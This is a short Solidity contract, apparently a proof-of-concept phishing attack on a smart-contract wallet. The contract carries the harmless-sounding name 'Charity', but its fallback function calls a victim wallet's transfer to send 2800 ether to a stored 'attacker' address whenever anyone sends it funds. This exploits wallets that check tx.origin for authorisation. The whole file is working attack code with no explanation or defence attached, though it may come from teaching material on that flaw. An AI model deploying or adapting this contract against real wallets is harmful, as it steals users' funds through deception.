// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

interface IWallet {
    function transfer(address payable _to, uint _amount) external;
}

contract Charity {
    IWallet iWallet;
    address payable attacker;

    constructor(address _wallet, address _attacker) {
        iWallet = IWallet(_wallet);
        attacker = payable(_attacker);
    }

    fallback() external payable {
        iWallet.transfer(attacker, 2800 ether);
    }
}
